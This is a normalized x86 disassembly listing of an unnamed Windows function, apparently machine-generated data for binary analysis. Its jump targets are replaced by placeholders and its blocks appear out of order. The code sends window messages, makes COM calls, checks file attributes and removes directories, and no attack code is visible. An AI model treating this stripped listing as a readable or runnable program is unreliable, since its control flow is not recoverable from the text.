call [ SendMessageW@IAT ]
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + edx + 0xd0 ]
sub ecx [ eax + edx + 0xcc ]
lea eax [ eax + edx + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
jae r-xdata
call sub_4407b7
mov eax [ ebp - 0x68 ]
mov ecx [ esi + 0x84 ]
xor ebx ebx
push ebx
push ebx
push 0x533
push ecx
call [ SendMessageW@IAT ]
lea edx [ ebp - 0xd8 ]
push edx
call sub_40f720
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0x14 ] ebx
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x84 ]
mov eax edi
imul eax eax 0xd8
push 0x0
add ecx eax
push ecx
push 0x52c
push edx
mov [ ebp - 0x1c ] eax
call [ SendMessageW@IAT ]
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
call sub_4407b7
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov edi [ ebp - 0x18 ]
add [ ebp - 0x14 ] 0xd8
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc edi
add eax edx
mov [ ebp - 0x18 ] edi
cmp edi eax
jb r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
mov edi [ ebp - 0xc8 ]
sub edi [ ebp - 0xcc ]
sar edi 0x2
cmp edi ebx
je r-xdata
mov [ ebp - 0x18 ] ebx
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
xor edi edi
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x14 ]
lea ebx [ ecx + edx + 0xc0 ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x84 ]
push ebx
push ebx
push 0x530
push eax
call [ SendMessageW@IAT ]
mov eax [ ebp - 0xcc ]
xor esi esi
cmp eax ebx
je r-xdata
ja r-xdata
mov ebx [ ebp - 0x14 ]
mov edx [ edi + 0xc ]
imul ebx ebx 0xd8
mov ecx [ ebx + edx + 0xd0 ]
sub ecx [ ebx + edx + 0xcc ]
lea eax [ ebx + edx + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x18 ] eax
jae r-xdata
call sub_4407b7
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x20 ] eax
jae r-xdata
call sub_4407b7
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x44 ]
cmp [ edx + ecx + 0x70 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ ebp - 0xd8 ]
push ecx
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] ebx
call sub_43f960
add esp 0x4
mov eax esi
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax [ ebp - 0xcc ]
mov ecx [ esi + 0x6c ]
mov edx [ esi + 0x48 ]
push edi
push eax
push 0x5
push ecx
call edx
add esp 0x10
call sub_4407b7
inc [ ebp - 0x14 ]
xor ebx ebx
jmp r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov dl [ esi + 0x7c ]
test dl dl
jne r-xdata
mov cl [ esi + 0x7c ]
test cl cl
jne r-xdata
inc edi
add [ ebp - 0x44 ] 0xc0
jmp r-xdata
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xa8 ]
xor ecx ebp
call sub_43f96b
add ebp 0xac
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jae r-xdata
mov edi [ edi + 0xc ]
mov ecx [ edi + ebx + 0xd0 ]
sub ecx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul ecx
mov ecx [ ebp - 0x18 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jb r-xdata
call sub_4407b7
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x18 ] ecx
jb r-xdata
mov edx [ edi + 0xcc ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x6
cmp [ eax + edx + 0x70 ] 0x0
mov [ ebp - 0x44 ] eax
je r-xdata
call sub_4407b7
mov ecx [ ebp - 0x18 ]
mov edx [ esi + 0x84 ]
mov ecx edi
imul ecx ecx 0xd8
add ecx [ ebx + 0xc ]
push 0x0
push ecx
push 0x52d
push edx
call [ SendMessageW@IAT ]
inc edi
jmp r-xdata
call sub_4407b7
mov ebx [ ebx + 0xc ]
add ebx [ ebp - 0x1c ]
mov eax 0x2aaaaaab
mov ecx [ ebx + 0xd0 ]
sub ecx [ ebx + 0xcc ]
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
inc [ ebp - 0x18 ]
jmp r-xdata
mov edi [ esi + 0xc ]
mov edx [ edi + 0x10 ]
sub edx [ edi + 0xc ]
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x28 ] edi
cmp edi eax
jae r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebx + 0xcc ]
lea eax [ eax + eax * 2 ]
shl eax 0x6
cmp [ eax + edx + 0x70 ] 0x0
mov [ ebp - 0x50 ] eax
je r-xdata
call sub_4407b7
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov edi [ edi + 0xc ]
mov edx [ edi + ebx + 0xd0 ]
sub edx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x18 ]
inc [ ebp - 0x20 ]
mov edi [ ebp - 0x28 ]
jmp r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov eax [ edi + 0xcc ]
add eax [ ebp - 0x44 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp ]
mov [ ebp + 0x18 ] 0xf
mov [ ebp + 0x14 ] 0x0
mov [ ebp + 0x4 ] 0x0
call sub_429ea0
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_40f720
lea edx [ ebp - 0x90 ]
push edx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xb
call sub_40f0f0
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
call sub_4407b7
mov ebx [ ebx + 0xc ]
add ebx [ ebp - 0x1c ]
mov eax 0x2aaaaaab
mov ecx [ ebx + 0xd0 ]
sub ecx [ ebx + 0xcc ]
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
xor ebx ebx
lea ecx [ ebp ]
push ecx
lea ebx [ ebp - 0x90 ]
call sub_40f670
mov ebx [ ebx + 0xcc ]
add ebx [ ebp - 0x50 ]
push 0xffffffff
push 0x0
push ebx
lea ecx [ ebp + 0x8c ]
mov [ ebp + 0xa4 ] 0xf
mov [ ebp + 0xa0 ] 0x0
mov [ ebp + 0x90 ] 0x0
call sub_429ea0
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
call sub_4407b7
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
xor eax eax
lea edx [ ebp - 0x40 ]
mov [ eax ] edx
jmp r-xdata
mov ecx [ ebp - 0x90 ]
xor eax eax
push ecx
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0x9
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov edx [ ebp - 0xac ]
mov edi [ ebp - 0x80 ]
mov eax [ ebp - 0x84 ]
push edx
call sub_412b30
mov eax [ ebp - 0x84 ]
push eax
call sub_43f960
add esp 0x8
mov edi [ edi + 0xc ]
add edi [ ebp - 0x54 ]
mov eax 0x2aaaaaab
mov ecx [ edi + 0xd0 ]
sub ecx [ edi + 0xcc ]
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov [ ebp - 0x18 ] 0x0
lea esp [ esp ]
lea ecx [ ebp + 0x8c ]
push ecx
lea ebx [ ebp - 0x40 ]
call sub_40f670
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp + 0x8c ]
mov [ ebp - 0x4 ] 0x2
call sub_40f0f0
mov ecx [ ebp - 0x30 ]
mov ebx ecx
sub ebx [ ebp - 0x34 ]
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov edx [ ebp + 0x4 ]
push edx
call sub_43f960
add esp 0x4
mov edi [ edi + 0xcc ]
add edi [ ebp - 0x44 ]
mov eax [ edi + 0x88 ]
lea ecx [ edi + 0x74 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov ebx [ esi + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov cl [ esi + 0x7c ]
test cl cl
je r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
cmp [ esi + 0x70 ] eax
je r-xdata
mov ebx [ ebx + 0xc ]
mov eax edi
imul eax eax 0xd8
mov ecx [ ebx + eax + 0xd0 ]
sub ecx [ ebx + eax + 0xcc ]
add ebx eax
mov [ ebp - 0x1c ] eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x28 ] eax
jb r-xdata
mov eax [ ebp - 0x34 ]
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x54 ]
lea edi [ ecx + edx + 0xc0 ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xcc ]
mov eax [ ebp - 0x24 ]
lea edi [ ecx + ecx * 2 ]
shl edi 0x6
mov [ edi + edx + 0x90 ] eax
mov ebx [ esi + 0xc ]
mov edx [ ebx + 0x10 ]
sub edx [ ebx + 0xc ]
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x28 ] eax
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x28 ]
mov edi [ edi + 0xc ]
imul ebx ebx 0xd8
mov ecx [ edi + ebx + 0xd0 ]
sub ecx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c ] ebx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
xor eax eax
mov ebx [ ebp - 0x30 ]
cmp eax ebx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ edx + ecx + 0x88 ]
lea ecx [ edx + ecx + 0x74 ]
push r--data
mov edi 0xa
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov eax [ ebp - 0x84 ]
lea edx [ ebx * 8 ]
sub edx ebx
cmp [ eax + edx * 4 + 0x18 ] 0x10
lea eax [ eax + edx * 4 ]
jb r-xdata
call sub_4407b7
mov ebx [ ebx + 0xc ]
add ebx [ ebp - 0x1c ]
mov eax 0x2aaaaaab
mov edx [ ebx + 0xd0 ]
sub edx [ ebx + 0xcc ]
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
mov edi [ edi + 0xcc ]
lea eax [ eax + eax * 2 ]
shl eax 0x6
mov edx [ edi + eax + 0x88 ]
add edi eax
mov [ ebp - 0x50 ] eax
mov eax edx
mov [ ebp - 0x54 ] edx
cmp eax edx
jae r-xdata
call sub_4407b7
mov ecx [ ebp + 0x90 ]
push ecx
call sub_43f960
add esp 0x4
jmp r-xdata
push eax
lea edi [ eax + 0x18 ]
jmp r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
jb r-xdata
cmp [ esi + 0x68 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ebx [ ebx + 0xcc ]
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x48 ]
mov [ edi + ebx + 0x98 ] ecx
mov [ edi + ebx + 0x9c ] edx
mov eax [ esi + 0x84 ]
xor ebx ebx
push ebx
push ebx
push 0x532
push eax
call [ SendMessageW@IAT ]
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
call sub_4407b7
mov ecx edx
cmp edx 0x8
jb r-xdata
mov [ ebp - 0x54 ] eax
cmp [ edi ] 0x10
jb r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x54 ]
lea edi [ ecx + edx + 0xc0 ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
call sub_4407b7
mov ecx [ ebp - 0x80 ]
mov ebx [ ebp - 0x84 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x20 ] eax
jb r-xdata
mov ebx [ ebp - 0x20 ]
inc ebx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
push eax
call sub_440cb9
add esp 0x4
mov ebx eax
push ebx
mov ecx esi
call sub_406180
test al al
jne r-xdata
mov eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
call sub_43f960
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0xa4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x68 ]
mov edi [ ebp - 0x30 ]
push ecx
call sub_412b30
mov edx [ ebp - 0x34 ]
push edx
call sub_43f960
add esp 0x8
cmp [ edi + 0x8c ] 0x8
jb r-xdata
mov ecx 0x8
mov [ edi ] 0xf
mov [ edi - 0x4 ] 0x0
mov [ edi - 0x14 ] 0x0
add edi 0x1c
lea edx [ edi - 0x18 ]
cmp edx ebx
jne r-xdata
mov eax [ edi - 0x14 ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ edi + 0xc ]
mov edx [ ebp - 0x44 ]
mov eax [ ecx + edx + 0x88 ]
lea ecx [ ecx + edx + 0x74 ]
push r--data
mov edi 0x8
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
mov eax [ ebp - 0x20 ]
lea edi [ eax * 8 ]
sub edi eax
add edi edi
add edi edi
cmp [ edi + ebx + 0x18 ] 0x10
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x84 ]
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x20 ] ebx
cmp ebx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xc
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov eax [ edx + 0x78 ]
push 0x0
push edi
call eax
test eax eax
jge r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
xor edi edi
add ecx edx
je r-xdata
mov ecx [ ebp + 0x90 ]
push ecx
call sub_43f960
add esp 0x4
add edi 0x78
mov edi [ edi + 0x78 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp [ esi + 0x68 ] eax
je r-xdata
lea ebx [ edi + ebx + 0x4 ]
mov ebx [ edi + ebx + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
mov edx [ ecx + 0x2c ]
push 0x1
push ebx
push eax
call edx
mov edi [ esi + 0x70 ]
mov eax [ edi ]
mov ecx [ eax + 0xfc ]
push edi
call ecx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov ecx [ esi + 0xb0 ]
sub ecx [ esi + 0xac ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
lea edi [ edx + eax - 0x1 ]
test edi edi
jl r-xdata
mov [ ebp - 0x24 ] edi
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov dx [ edi ]
cmp dx [ eax ]
jne r-xdata
mov eax r--data
test ecx ecx
jbe r-xdata
mov ecx [ ebp - 0x80 ]
sub ecx [ ebp - 0x84 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx [ ebp - 0x80 ]
mov ebx [ ebp - 0x84 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ esi + 0xbc ] 0x0
je r-xdata
push 0x3b
push ebx
call sub_441150
add esp 0x8
test eax eax
je r-xdata
mov edi [ esi + 0x70 ]
mov edx [ edi ]
mov eax [ edx + 0xec ]
push ebx
push edi
call eax
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xb
inc ebx
jmp r-xdata
lea ebx [ edi * 8 ]
sub ebx edi
add ebx ebx
add ebx ebx
nop
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x28 ] eax
jb r-xdata
xor eax eax
cmp edx 0x8
setne al
mov cx dx
cmp cx [ eax ]
sbb eax eax
and eax 0xfffffffe
add eax 0x1
jne r-xdata
add edi 0x2
add eax 0x2
sub ecx 0x1
jne r-xdata
mov edx [ ebp - 0x84 ]
lea ecx [ ebx * 8 ]
sub ecx ebx
cmp [ edx + ecx * 4 + 0x18 ] 0x10
lea eax [ edx + ecx * 4 ]
jb r-xdata
call sub_4407b7
cmp [ edi + ebx + 0x18 ] 0x10
jb r-xdata
call sub_4407b7
mov ebx [ ebp - 0x84 ]
add esi 0xb8
call sub_42ebf0
mov ecx [ ebp - 0x58 ]
mov edx [ ecx + 0x84 ]
push 0x0
push 0x1
push 0x534
push edx
call [ SendMessageW@IAT ]
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0x58 ]
inc ebx
jmp r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
mov edx [ ecx + 0x2c ]
push 0x1
push ebx
push eax
call edx
mov edi [ esi + 0x70 ]
lea ecx [ ebp - 0xc0 ]
push ecx
lea edx [ ebp - 0xe4 ]
push edx
lea ecx [ ebp - 0xdc ]
push ecx
mov [ ebp - 0xc0 ] 0x0
mov eax [ edi ]
mov edx [ eax + 0xbc ]
push ebx
push edi
call edx
test eax eax
jge r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov eax [ esi + 0xac ]
add eax ebx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov edi [ edi + 0xc ]
mov ecx [ edi + ebx + 0xd0 ]
sub ecx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
push eax
lea ecx [ eax + 0x2 ]
mov edx esi
call sub_402f50
test al al
je r-xdata
test eax eax
jne r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edi [ edi + ebx + 0x4 ]
mov edi [ edi + ebx + 0x4 ]
jmp r-xdata
push r--data
push edi
push eax
call sub_43f7d0
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ edi + 0xcc ]
add edi [ ebp - 0x50 ]
mov eax [ edi + 0x88 ]
lea ecx [ edi + 0x74 ]
push r--data
mov edi 0xa
call sub_4298e0
test eax eax
jne r-xdata
call sub_4407b7
inc [ ebp - 0x18 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x28 ]
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x34 ]
mov edi [ ebp - 0x18 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
mov ecx [ esi + 0x54 ]
lea edx [ ebp - 0xac ]
push edx
push eax
mov eax [ esi + 0x6c ]
push eax
call ecx
add esp 0x10
lea ebx [ ebp - 0xb8 ]
lea edi [ ebp - 0xd8 ]
call sub_40f7b0
mov eax [ esi + 0x6c ]
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx [ esi + 0x54 ]
lea edx [ ebp - 0xa0 ]
push edx
push edi
push eax
call ecx
mov eax [ ebp - 0xa0 ]
mov ecx [ esi + 0x6c ]
push 0x1
lea edx [ ebp - 0xa8 ]
push edx
mov edx [ esi + 0x48 ]
push eax
push ecx
call edx
mov ebx [ ebp - 0x20 ]
add esp 0x20
inc ebx
jmp r-xdata
mov ecx [ esi + 0xb0 ]
sub ecx [ esi + 0xac ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
jb r-xdata
mov ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xb
inc ebx
jmp r-xdata
push eax
call [ RemoveDirectoryW@IAT ]
dec edi
sub ebx 0x1c
test edi edi
jge r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
mov ecx [ esi + 0x98 ]
sub ecx [ esi + 0x94 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
and ebx 0xfffffffe
cmp edi ecx
jb r-xdata
push eax
call [ GetFileAttributesW@IAT ]
mov ebx eax
test bl 0x1
je r-xdata
mov edi [ esi + 0xc ]
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x28 ] eax
jb r-xdata
mov ecx [ ebp - 0x30 ]
mov ebx [ ebp - 0x34 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jb r-xdata
sub ecx [ ebp - 0x34 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x18 ] eax
jae r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ edi * 8 ]
sub ecx edi
cmp [ edx + ecx * 4 + 0x18 ] 0x10
lea eax [ edx + ecx * 4 ]
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov eax [ esi + 0x94 ]
add eax [ ebp - 0x24 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
mov edi [ edi + 0xc ]
mov ecx [ edi + ebx + 0xd0 ]
sub ecx [ edi + ebx + 0xcc ]
add edi ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp - 0x20 ] ecx
jb r-xdata
call sub_4407b7
mov eax [ ebp - 0x18 ]
lea edi [ eax * 8 ]
sub edi eax
add edi edi
add edi edi
cmp [ edi + ebx + 0x18 ] 0x10
